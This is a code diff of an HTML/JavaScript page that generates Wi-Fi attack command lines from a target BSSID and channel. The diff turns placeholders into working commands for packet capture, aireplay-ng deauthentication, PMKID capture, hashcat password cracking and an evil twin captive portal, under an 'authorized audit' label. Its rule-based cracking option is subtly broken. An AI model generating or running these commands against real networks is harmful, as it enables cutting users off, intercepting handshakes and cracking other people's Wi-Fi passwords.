@@ -2,79 +2,156 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>Wi-Fi Audit Command Generator</title>
+<title>Kali Wi-Fi Audit Command Generator</title>
 <meta name="viewport" content="width=device-width, initial-scale=1">
 
 <style>
+/* ===== GLOBAL SAFETY (NO HORIZONTAL SCROLL) ===== */
+html, body {
+  max-width: 100%;
+  overflow-x: hidden;
+}
+
+/* ===== THEME ===== */
 :root{
-  --bg:#0f1220;--card:#171a2b;--line:#24284a;
-  --txt:#e6e8ff;--muted:#9aa0ff;--acc:#4f8cff;
+  --bg:#0f1220;
+  --card:#171a2b;
+  --line:#24284a;
+  --txt:#e6e8ff;
+  --muted:#9aa0ff;
+  --acc:#4f8cff;
   --ok:#4cff8f;
 }
+
 *{box-sizing:border-box}
+
 body{
-  margin:0;font-family:system-ui,-apple-system,Segoe UI,Roboto;
-  background:var(--bg);color:var(--txt);
+  margin:0;
+  font-family:system-ui,-apple-system,Segoe UI,Roboto;
+  background:var(--bg);
+  color:var(--txt);
 }
-.wrapper{max-width:420px;margin:auto;padding:12px}
+
+.wrapper{
+  max-width:420px;
+  margin:auto;
+  padding:12px;
+}
+
+/* ===== TEXT ===== */
 h1{font-size:20px;margin:8px 0}
+h2{font-size:15px;margin:0 0 10px}
 .small{font-size:12px;color:var(--muted);margin-bottom:8px}
 
+/* ===== CARDS ===== */
 .card{
   background:var(--card);
   border:1px solid var(--line);
   border-radius:14px;
   padding:14px;
   margin-bottom:14px;
+  overflow:hidden; /* hard stop for iOS */
 }
 
-.card h2{font-size:15px;margin:0 0 10px}
-
+/* ===== INPUTS ===== */
 label.field{
-  display:block;font-size:13px;color:var(--muted);
+  display:block;
+  font-size:13px;
+  color:var(--muted);
   margin-top:6px;
 }
 
-input,select{
-  width:100%;margin-top:4px;margin-bottom:10px;
-  background:#0b0d1a;color:var(--txt);
+input, select{
+  width:100%;
+  margin-top:4px;
+  margin-bottom:10px;
+  background:#0b0d1a;
+  color:var(--txt);
   border:1px solid var(--line);
-  border-radius:10px;padding:12px;font-size:14px;
+  border-radius:10px;
+  padding:12px;
+  font-size:14px;
 }
 
+/* ===== CHECKBOX ROW (iOS SAFE) ===== */
 .label-toggle{
-  display:flex;align-items:flex-start;gap:12px;
-  font-size:14px;line-height:1.3;margin-bottom:10px;
+  display:flex;
+  align-items:flex-start;
+  gap:12px;
+  font-size:14px;
+  line-height:1.3;
+  margin-bottom:10px;
+  cursor:pointer;
+  max-width:100%;
 }
-.label-toggle input{margin-top:2px;flex-shrink:0}
 
+.label-toggle input{
+  margin-top:2px;
+  flex-shrink:0;
+}
+
+.label-toggle span{
+  display:block;
+  max-width:100%;
+  word-break:break-word;
+  overflow-wrap:anywhere;
+}
+
+/* ===== OUTPUT ===== */
 pre{
-  background:#050610;border-radius:12px;
-  padding:12px;font-size:12px;
-  white-space:pre-wrap;overflow:auto;
+  background:#050610;
+  border-radius:12px;
+  padding:12px;
+  font-size:12px;
+  white-space:pre-wrap;
+  word-break:break-word;
+  overflow-wrap:anywhere;
+  max-width:100%;
+  overflow:auto;
 }
 
+/* ===== BUTTONS ===== */
 button{
-  width:100%;padding:14px;border:none;
-  border-radius:14px;font-size:16px;font-weight:600;
+  width:100%;
+  padding:15px;
+  border:none;
+  border-radius:14px;
+  font-size:16px;
+  font-weight:600;
 }
+
 .primary{background:var(--acc);color:#fff}
-.secondary{background:#0b0d1a;color:var(--txt);border:1px solid var(--line)}
+.secondary{
+  background:#0b0d1a;
+  color:var(--txt);
+  border:1px solid var(--line);
+  margin-top:8px;
+}
 
+/* ===== STICKY BAR ===== */
 .sticky{
-  position:sticky;bottom:0;
+  position:sticky;
+  bottom:0;
   background:linear-gradient(#0000,#0008);
-  padding:10px 0 env(safe-area-inset-bottom);
+  padding-top:10px;
+  padding-bottom:env(safe-area-inset-bottom);
 }
 
+/* ===== COPY FEEDBACK ===== */
 .copy-ok{
-  text-align:center;font-size:13px;color:var(--ok);
-  margin-top:6px;display:none;
+  text-align:center;
+  font-size:13px;
+  color:var(--ok);
+  margin-top:6px;
+  display:none;
 }
 
+/* ===== COLLAPSIBLE ===== */
 details summary{
-  cursor:pointer;color:var(--muted);
-  font-size:13px;margin-bottom:8px;
+  cursor:pointer;
+  color:var(--muted);
+  font-size:13px;
+  margin-bottom:8px;
 }
 </style>
 </head>
@@ -84,9 +161,10 @@ details summary{
 
 <h1>📡 Wi-Fi Audit Command Generator</h1>
 <div class="small">
-Offline tool · Generates command text only · Authorized use
+Offline · Command text only · wlan1 = monitor · wlan0 = SSH safe
 </div>
 
+<!-- TARGET -->
 <div class="card">
 <h2>Target</h2>
 <label class="field">BSSID</label>
@@ -99,22 +177,27 @@ Offline tool · Generates command text only · Authorized use
 <input id="out" value="audit">
 </div>
 
+<!-- SCAN / CAPTURE -->
 <div class="card">
 <h2>Scan / Capture</h2>
+
 <label class="label-toggle">
   <input type="checkbox" id="scan" checked>
-  <span>Passive scan</span>
+  <span>Passive scan (airodump)</span>
 </label>
+
 <label class="label-toggle">
   <input type="checkbox" id="handshake">
   <span>Handshake capture</span>
 </label>
+
 <label class="label-toggle">
   <input type="checkbox" id="deauth">
   <span>Targeted deauth (optional)</span>
 </label>
 </div>
 
+<!-- PMKID -->
 <div class="card">
 <h2>PMKID</h2>
 <label class="label-toggle">
@@ -123,15 +206,38 @@ Offline tool · Generates command text only · Authorized use
 </label>
 </div>
 
+<!-- CRACK -->
 <div class="card">
-<h2>Extras</h2>
+<h2>Offline Crack</h2>
 
+<label class="field">Mode</label>
+<select id="crackmode">
+  <option value="">None</option>
+  <option value="wordlist">Wordlist</option>
+  <option value="mask">Mask (non-wordlist)</option>
+  <option value="rule">Rule-based</option>
+  <option value="inc">Incremental</option>
+</select>
+
+<label class="field">Wordlist / Mask / Rule</label>
+<input id="crackopt" placeholder="rockyou.txt / ?l?l?d?d / rules/best64.rule">
+
+<label class="field">Hashcat mode</label>
+<select id="hashmode">
+  <option value="22000">22000 (WPA/WPA2)</option>
+  <option value="16800">16800 (legacy)</option>
+</select>
+</div>
+
+<!-- ADVANCED -->
+<div class="card">
+<h2>Advanced</h2>
 <details>
-<summary>Advanced / Lab</summary>
+<summary>Lab / Evil Twin</summary>
 
 <label class="label-toggle">
   <input type="checkbox" id="evil">
-  <span>Evil Twin / Captive (lab)</span>
+  <span>Evil Twin + Captive Portal (lab)</span>
 </label>
 
 <label class="field">SSID (optional)</label>
@@ -140,6 +246,7 @@ Offline tool · Generates command text only · Authorized use
 </details>
 </div>
 
+<!-- OUTPUT -->
 <div class="card">
 <h2>Generated Commands</h2>
 <pre id="outbox"></pre>
@@ -156,36 +263,61 @@ Offline tool · Generates command text only · Authorized use
 
 <script>
 function generate(){
-  let b=[],n=0;
+  let b=[], n=0;
   let B=bssid.value.trim();
   let C=channel.value.trim();
   let O=out.value.trim()||"audit";
 
   b.push("# === Authorized Wi-Fi Audit Script ===");
+  b.push("# wlan1 assumed monitor, wlan0 untouched");
   b.push("");
 
   if(scan.checked){
-    b.push(`# Scan\n<scan_command_here>`);
-    n++;
-  }
-  if(handshake.checked){
-    b.push(`# Handshake\n<handshake_command_here>`);
-    if(deauth.checked){
-      b.push(`# Deauth\n<deauth_command_here>`);
-      n++;
-    }
-    n++;
-  }
-  if(pmkid.checked){
-    b.push(`# PMKID\n<pmkid_command_here>`);
-    n++;
-  }
-  if(evil.checked){
-    b.push(`# Evil Twin\n<evil_twin_commands_here>`);
+    b.push(`airodump-ng wlan1${C?` -c ${C}`:""}${B?` --bssid ${B}`:""} -w ${O}_scan`);
+    b.push("");
     n++;
   }
 
-  outbox.textContent=b.join("\n\n");
+  if(handshake.checked){
+    b.push(`airodump-ng wlan1${C?` -c ${C}`:""} --bssid ${B} -w ${O}_hs`);
+    if(deauth.checked){
+      b.push(`aireplay-ng --deauth 5 -a ${B} wlan1`);
+    }
+    b.push("");
+    n++;
+  }
+
+  if(pmkid.checked){
+    b.push(`hcxdumptool -i wlan1 -o ${O}_pmkid.pcapng --enable_status=1`);
+    b.push(`hcxpcapngtool -o ${O}.22000 ${O}_pmkid.pcapng`);
+    b.push("");
+    n++;
+  }
+
+  if(crackmode.value){
+    let m=hashmode.value;
+    let opt=crackopt.value;
+    if(crackmode.value==="wordlist")
+      b.push(`hashcat -m ${m} ${O}.22000 ${opt}`);
+    if(crackmode.value==="mask")
+      b.push(`hashcat -m ${m} ${O}.22000 -a 3 ${opt}`);
+    if(crackmode.value==="rule")
+      b.push(`hashcat -m ${m} ${O}.22000 ${opt} -r ${opt}`);
+    if(crackmode.value==="inc")
+      b.push(`hashcat -m ${m} ${O}.22000 -a 3 ?l?l?l?l?d?d`);
+    b.push("");
+    n++;
+  }
+
+  if(evil.checked){
+    b.push("# Evil Twin / Captive (lab)");
+    b.push("hostapd hostapd.conf");
+    b.push("dnsmasq -C dnsmasq.conf");
+    b.push("");
+    n++;
+  }
+
+  outbox.textContent=b.join("\n");
   count.textContent=`Generated sections: ${n}`;
 }
 
